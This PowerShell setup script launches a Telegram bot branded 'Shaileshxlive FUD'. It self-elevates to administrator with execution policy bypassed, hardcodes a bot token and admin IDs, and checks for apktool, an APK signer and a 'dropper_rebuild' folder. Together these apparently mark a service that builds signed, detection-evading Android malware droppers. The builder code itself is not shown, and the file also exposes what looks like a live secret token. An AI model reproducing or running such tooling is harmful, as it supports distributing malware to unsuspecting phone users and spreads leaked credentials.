#Requires -Version 5.1

# Auto-elevation
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if (-not $isAdmin) {
    Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -NoExit -File `"$PSCommandPath`""
    exit
}

$ErrorActionPreference = "Stop"
$ROOT = Split-Path -Parent $MyInvocation.MyCommand.Path

# ===========================================================================
#   CONFIGURATION - Shaileshxlive
# ===========================================================================

$env:TELEGRAM_BOT_TOKEN        = "8643119831:AAErlSUMWHjvQqLqT7N0VPa4GPI3DCwDJLI"
$env:TELEGRAM_MASTER_USERS     = "8739519477"
$env:TELEGRAM_AUTHORIZED_USERS = ""
$env:DEVELOPER_USERNAME        = "@Shaileshxlive"
$env:BUILD_LOG_CHANNEL         = "-1004457898119"

# ===========================================================================

function Write-Step($msg) {
    Write-Host ""
    Write-Host "  $msg" -ForegroundColor Cyan
    Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
}
function Write-OK($msg)   { Write-Host "     [OK]  $msg" -ForegroundColor Green }
function Write-WARN($msg) { Write-Host "     [!!]  $msg" -ForegroundColor Yellow }
function Write-FAIL($msg) { Write-Host "     [XX]  $msg" -ForegroundColor Red }
function Write-INFO($msg) { Write-Host "           $msg" -ForegroundColor Gray }

Clear-Host
Write-Host ""
Write-Host "  ================================================" -ForegroundColor Magenta
Write-Host "       Shaileshxlive FUD - Telegram Bot          " -ForegroundColor Magenta
Write-Host "       Windows Server 2022                       " -ForegroundColor DarkGray
Write-Host "  ================================================" -ForegroundColor Magenta

$pythonCmd = "python"

# ---------------------------------------------------------------------------
# 1. PYTHON DEPENDENCIES
# ---------------------------------------------------------------------------
Write-Step "1/2  Python Dependencies"

Write-INFO "Upgrading pip..."
try {
    & $pythonCmd -m pip install --upgrade pip --quiet 2>&1 | Out-Null
    Write-OK "Pip upgraded"
} catch {
    Write-WARN "Could not upgrade pip"
}

$reqFile = Join-Path $ROOT "requirements.txt"
if (Test-Path $reqFile) {
    Write-INFO "Installing requirements.txt..."
    & $pythonCmd -m pip install -r $reqFile --quiet 2>&1 | Out-Null
    Write-OK "Requirements installed"
} else {
    Write-INFO "Installing base packages..."
    & $pythonCmd -m pip install requests pillow certifi --quiet 2>&1 | Out-Null
    Write-OK "Base packages installed"
}

# ---------------------------------------------------------------------------
# 2. DIRECTORIES AND TOOLS
# ---------------------------------------------------------------------------
Write-Step "2/2  Environment"

$botDir = Join-Path $ROOT "telegram"
foreach ($d in @(
    "telegram\data",
    "telegram\logs",
    "telegram\uploads\bot_temp",
    "telegram\outputs",
    "telegram\temp"
)) {
    $full = Join-Path $ROOT $d
    if (-not (Test-Path $full)) {
        New-Item -ItemType Directory -Path $full -Force | Out-Null
        Write-INFO "Created: $d"
    }
}
Write-OK "Bot directories verified"

foreach ($tool in @("apktool.jar", "signer.jar")) {
    if (Test-Path (Join-Path $ROOT $tool)) {
        Write-OK "$tool found"
    } else {
        Write-WARN "$tool NOT found - builds will fail!"
    }
}

if (Test-Path (Join-Path $ROOT "dropper_rebuild")) {
    Write-OK "dropper_rebuild found"
} else {
    Write-WARN "dropper_rebuild NOT found - builds will fail!"
}

# ---------------------------------------------------------------------------
# START BOT
# ---------------------------------------------------------------------------
Write-Host ""
Write-Host "  ================================================" -ForegroundColor Magenta
Write-Host "   Starting Telegram Bot...                      " -ForegroundColor Green
Write-Host "  ================================================" -ForegroundColor Magenta
Write-Host ""

$botScript = Join-Path $botDir "bot.py"

if (-not (Test-Path $botScript)) {
    Write-FAIL "telegram\bot.py not found!"
    Read-Host "Press ENTER to exit"
    exit 1
}

# Kill old bot instances
Write-INFO "Checking for older bot instances..."
try {
    $oldProcs = Get-WmiObject Win32_Process -Filter "Name='python.exe'" |
        Where-Object { $_.CommandLine -like "*bot.py*" }
    foreach ($proc in $oldProcs) {
        Write-INFO "Terminating PID $($proc.ProcessId)..."
        Stop-Process -Id $proc.ProcessId -Force -ErrorAction SilentlyContinue
    }
    if ($oldProcs) { Start-Sleep -Seconds 1 }
} catch {}

Write-Host ""
Write-Host "  ================================================" -ForegroundColor Magenta
Write-Host "   BOT STARTING                                  " -ForegroundColor Green
Write-Host "  ================================================" -ForegroundColor Magenta
Write-Host ""
Write-Host "   Bot: Shaileshxlive FUD" -ForegroundColor Cyan
Write-Host "   Admin: 8739519477" -ForegroundColor Cyan
Write-Host "   Log Channel: -1004457898119" -ForegroundColor Cyan
Write-Host ""
Write-Host "   Press Ctrl+C to stop" -ForegroundColor DarkGray
Write-Host "  ================================================" -ForegroundColor Magenta
Write-Host ""

Set-Location $botDir
try {
    & $pythonCmd "bot.py"
} catch {
    Write-FAIL "Bot terminated with error: $_"
}

Write-Host ""
Write-Host "  Bot stopped." -ForegroundColor Yellow
Read-Host "Press ENTER to close"